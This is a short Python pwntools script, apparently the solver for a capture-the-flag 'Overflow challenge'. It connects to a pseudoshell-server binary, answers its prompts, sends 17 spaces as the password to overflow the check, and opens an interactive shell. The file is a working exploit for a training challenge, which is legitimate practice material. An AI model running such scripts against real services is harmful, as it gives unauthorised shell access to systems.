#! /usr/bin/env python3
##
# Created for the Overflow challenge
# By Amos (LFlare) Ng <amosng1@gmail.com>
##
import sys
from pwn import *

# Start binary in pipe or connect to socket
if len(sys.argv) == 3:
    t = remote(sys.argv[1], int(sys.argv[2]))
else:
    t = process("../service/pseudoshell-server")

# Send payload and dump initial output
t.recvuntil("(yes/no)? ")
t.sendline("yes")
t.recvuntil("password: ")
t.sendline(" " * 17)

# launch shell
t.interactive()
